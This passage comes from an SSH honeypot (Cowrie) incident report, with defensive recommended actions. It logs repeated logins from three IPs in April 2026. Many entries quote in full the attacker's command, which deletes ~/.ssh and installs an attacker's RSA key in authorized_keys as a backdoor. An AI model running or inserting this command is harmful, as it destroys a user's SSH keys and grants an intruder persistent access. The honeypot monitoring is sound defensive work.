| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:13:48` | `cowrie.session.connect` |
| `2026-04-07 05:13:48` | `cowrie.client.version` |
| `2026-04-07 05:13:48` | `cowrie.client.kex` |
| `2026-04-07 05:13:48` | `cowrie.login.success` |
| `2026-04-07 05:13:48` | `cowrie.session.params` |
| `2026-04-07 05:13:48` | `cowrie.command.input` |
| `2026-04-07 05:13:48` | `cowrie.command.failed` |
| `2026-04-07 05:13:49` | `cowrie.log.closed` |
| `2026-04-07 05:13:49` | `cowrie.session.params` |
| `2026-04-07 05:13:49` | `cowrie.command.input` |
| `2026-04-07 05:13:49` | `cowrie.session.file_download` |
| `2026-04-07 05:13:49` | `cowrie.log.closed` |
| `2026-04-07 05:13:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcfcb32c037b

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:13 |
| **Last Seen** | 2026-04-07 05:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:13:51` | `cowrie.session.connect` |
| `2026-04-07 05:13:51` | `cowrie.client.version` |
| `2026-04-07 05:13:51` | `cowrie.client.kex` |
| `2026-04-07 05:13:51` | `cowrie.login.success` |
| `2026-04-07 05:13:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-068d2e429307

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:16 |
| **Last Seen** | 2026-04-07 05:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:16:01` | `cowrie.session.connect` |
| `2026-04-07 05:16:01` | `cowrie.client.version` |
| `2026-04-07 05:16:01` | `cowrie.client.kex` |
| `2026-04-07 05:16:02` | `cowrie.login.success` |
| `2026-04-07 05:16:02` | `cowrie.session.params` |
| `2026-04-07 05:16:02` | `cowrie.command.input` |
| `2026-04-07 05:16:02` | `cowrie.command.failed` |
| `2026-04-07 05:16:02` | `cowrie.log.closed` |
| `2026-04-07 05:16:03` | `cowrie.session.params` |
| `2026-04-07 05:16:03` | `cowrie.command.input` |
| `2026-04-07 05:16:03` | `cowrie.session.file_download` |
| `2026-04-07 05:16:03` | `cowrie.log.closed` |
| `2026-04-07 05:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0514a65b636

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:16 |
| **Last Seen** | 2026-04-07 05:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:16:06` | `cowrie.session.connect` |
| `2026-04-07 05:16:06` | `cowrie.client.version` |
| `2026-04-07 05:16:06` | `cowrie.client.kex` |
| `2026-04-07 05:16:07` | `cowrie.login.success` |
| `2026-04-07 05:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd8ef4898739

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:16 |
| **Last Seen** | 2026-04-07 05:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:16:33` | `cowrie.session.connect` |
| `2026-04-07 05:16:33` | `cowrie.client.version` |
| `2026-04-07 05:16:34` | `cowrie.client.kex` |
| `2026-04-07 05:16:34` | `cowrie.login.success` |
| `2026-04-07 05:16:35` | `cowrie.session.params` |
| `2026-04-07 05:16:35` | `cowrie.command.input` |
| `2026-04-07 05:16:35` | `cowrie.command.failed` |
| `2026-04-07 05:16:35` | `cowrie.log.closed` |
| `2026-04-07 05:16:35` | `cowrie.session.params` |
| `2026-04-07 05:16:35` | `cowrie.command.input` |
| `2026-04-07 05:16:35` | `cowrie.session.file_download` |
| `2026-04-07 05:16:35` | `cowrie.log.closed` |
| `2026-04-07 05:16:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef16ddeecf2b

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:16 |
| **Last Seen** | 2026-04-07 05:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:16:38` | `cowrie.session.connect` |
| `2026-04-07 05:16:38` | `cowrie.client.version` |
| `2026-04-07 05:16:38` | `cowrie.client.kex` |
| `2026-04-07 05:16:38` | `cowrie.login.success` |
| `2026-04-07 05:16:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13f49c571c7a

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:17 |
| **Last Seen** | 2026-04-07 05:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:17:33` | `cowrie.session.connect` |
| `2026-04-07 05:17:33` | `cowrie.client.version` |
| `2026-04-07 05:17:33` | `cowrie.client.kex` |
| `2026-04-07 05:17:34` | `cowrie.login.success` |
| `2026-04-07 05:17:35` | `cowrie.session.params` |
| `2026-04-07 05:17:35` | `cowrie.command.input` |
| `2026-04-07 05:17:35` | `cowrie.command.failed` |
| `2026-04-07 05:17:35` | `cowrie.log.closed` |
| `2026-04-07 05:17:35` | `cowrie.session.params` |
| `2026-04-07 05:17:35` | `cowrie.command.input` |
| `2026-04-07 05:17:36` | `cowrie.session.file_download` |
| `2026-04-07 05:17:36` | `cowrie.log.closed` |
| `2026-04-07 05:17:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76b51dc4c39c

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:17 |
| **Last Seen** | 2026-04-07 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:17:38` | `cowrie.session.connect` |
| `2026-04-07 05:17:38` | `cowrie.client.version` |
| `2026-04-07 05:17:39` | `cowrie.client.kex` |
| `2026-04-07 05:17:40` | `cowrie.login.success` |
| `2026-04-07 05:17:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16dfd063a13b

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:19 |
| **Last Seen** | 2026-04-07 05:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:19:17` | `cowrie.session.connect` |
| `2026-04-07 05:19:17` | `cowrie.client.version` |
| `2026-04-07 05:19:18` | `cowrie.client.kex` |
| `2026-04-07 05:19:18` | `cowrie.login.success` |
| `2026-04-07 05:19:18` | `cowrie.session.params` |
| `2026-04-07 05:19:18` | `cowrie.command.input` |
| `2026-04-07 05:19:18` | `cowrie.command.failed` |
| `2026-04-07 05:19:18` | `cowrie.log.closed` |
| `2026-04-07 05:19:19` | `cowrie.session.params` |
| `2026-04-07 05:19:19` | `cowrie.command.input` |
| `2026-04-07 05:19:19` | `cowrie.session.file_download` |
| `2026-04-07 05:19:19` | `cowrie.log.closed` |
| `2026-04-07 05:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7357553052e3

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:19 |
| **Last Seen** | 2026-04-07 05:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:19:20` | `cowrie.session.connect` |
| `2026-04-07 05:19:20` | `cowrie.client.version` |
| `2026-04-07 05:19:21` | `cowrie.client.kex` |
| `2026-04-07 05:19:21` | `cowrie.login.success` |
| `2026-04-07 05:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca6c5934a470

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:21 |
| **Last Seen** | 2026-04-07 05:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:21:07` | `cowrie.session.connect` |
| `2026-04-07 05:21:07` | `cowrie.client.version` |
| `2026-04-07 05:21:07` | `cowrie.client.kex` |
| `2026-04-07 05:21:07` | `cowrie.login.success` |
| `2026-04-07 05:21:07` | `cowrie.session.params` |
| `2026-04-07 05:21:07` | `cowrie.command.input` |
| `2026-04-07 05:21:07` | `cowrie.command.failed` |
| `2026-04-07 05:21:08` | `cowrie.log.closed` |
| `2026-04-07 05:21:08` | `cowrie.session.params` |
| `2026-04-07 05:21:08` | `cowrie.command.input` |
| `2026-04-07 05:21:08` | `cowrie.session.file_download` |
| `2026-04-07 05:21:08` | `cowrie.log.closed` |
| `2026-04-07 05:21:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2798d73a1743

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:21 |
| **Last Seen** | 2026-04-07 05:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:21:10` | `cowrie.session.connect` |
| `2026-04-07 05:21:10` | `cowrie.client.version` |
| `2026-04-07 05:21:10` | `cowrie.client.kex` |
| `2026-04-07 05:21:10` | `cowrie.login.success` |
| `2026-04-07 05:21:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fe191ad7fbf

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:22 |
| **Last Seen** | 2026-04-07 05:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:22:06` | `cowrie.session.connect` |
| `2026-04-07 05:22:06` | `cowrie.client.version` |
| `2026-04-07 05:22:07` | `cowrie.client.kex` |
| `2026-04-07 05:22:08` | `cowrie.login.success` |
| `2026-04-07 05:22:08` | `cowrie.session.params` |
| `2026-04-07 05:22:08` | `cowrie.command.input` |
| `2026-04-07 05:22:08` | `cowrie.command.failed` |
| `2026-04-07 05:22:08` | `cowrie.log.closed` |
| `2026-04-07 05:22:09` | `cowrie.session.params` |
| `2026-04-07 05:22:09` | `cowrie.command.input` |
| `2026-04-07 05:22:09` | `cowrie.session.file_download` |
| `2026-04-07 05:22:09` | `cowrie.log.closed` |
| `2026-04-07 05:22:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09090d8410fd

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:22 |
| **Last Seen** | 2026-04-07 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:22:12` | `cowrie.session.connect` |
| `2026-04-07 05:22:12` | `cowrie.client.version` |
| `2026-04-07 05:22:12` | `cowrie.client.kex` |
| `2026-04-07 05:22:13` | `cowrie.login.success` |
| `2026-04-07 05:22:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ce8fc46d775

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:22 |
| **Last Seen** | 2026-04-07 05:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:22:54` | `cowrie.session.connect` |
| `2026-04-07 05:22:54` | `cowrie.client.version` |
| `2026-04-07 05:22:54` | `cowrie.client.kex` |
| `2026-04-07 05:22:55` | `cowrie.login.success` |
| `2026-04-07 05:22:55` | `cowrie.session.params` |
| `2026-04-07 05:22:55` | `cowrie.command.input` |
| `2026-04-07 05:22:55` | `cowrie.command.failed` |
| `2026-04-07 05:22:55` | `cowrie.log.closed` |
| `2026-04-07 05:22:56` | `cowrie.session.params` |
| `2026-04-07 05:22:56` | `cowrie.command.input` |
| `2026-04-07 05:22:56` | `cowrie.session.file_download` |
| `2026-04-07 05:22:56` | `cowrie.log.closed` |
| `2026-04-07 05:22:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdc8135d780b

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:22 |
| **Last Seen** | 2026-04-07 05:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:22:57` | `cowrie.session.connect` |
| `2026-04-07 05:22:57` | `cowrie.client.version` |
| `2026-04-07 05:22:58` | `cowrie.client.kex` |
| `2026-04-07 05:22:58` | `cowrie.login.success` |
| `2026-04-07 05:22:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39789fa3703c

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:24 |
| **Last Seen** | 2026-04-07 05:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:24:39` | `cowrie.session.connect` |
| `2026-04-07 05:24:39` | `cowrie.client.version` |
| `2026-04-07 05:24:39` | `cowrie.client.kex` |
| `2026-04-07 05:24:39` | `cowrie.login.success` |
| `2026-04-07 05:24:40` | `cowrie.session.params` |
| `2026-04-07 05:24:40` | `cowrie.command.input` |
